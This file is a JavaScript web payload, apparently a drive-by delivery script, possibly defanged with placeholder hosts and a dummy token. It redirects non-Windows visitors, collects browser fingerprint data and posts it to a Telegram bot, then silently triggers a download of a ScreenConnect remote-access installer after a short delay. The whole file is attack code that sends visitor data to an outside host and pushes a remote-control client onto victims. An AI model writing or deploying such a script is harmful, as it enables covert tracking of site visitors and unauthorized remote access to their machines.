async function deliver() {
  if (!/Windows/.test(navigator.userAgent)) {
    window.location.replace('https://filter.example.invalid/E/');
    return;
  }
  const profile = { ua: navigator.userAgent, os: navigator.platform,
    width: screen.width, height: screen.height, utc: new Date().toISOString() };
  await fetch('https://api.telegram.org/bot000000000:EXAMPLE_NONFUNCTIONAL_TOKEN/sendMessage', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({chat_id: '000000', text: JSON.stringify(profile)})
  });
  const link = document.createElement('a');
  link.href = 'https://tenant.example.invalid/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest&t=VARIANT';
  link.download = 'ScreenConnect.ClientSetup.exe';
  link.style.display = 'none';
  document.body.appendChild(link);
  setTimeout(() => { link.click(); }, 3000);
}
deliver();
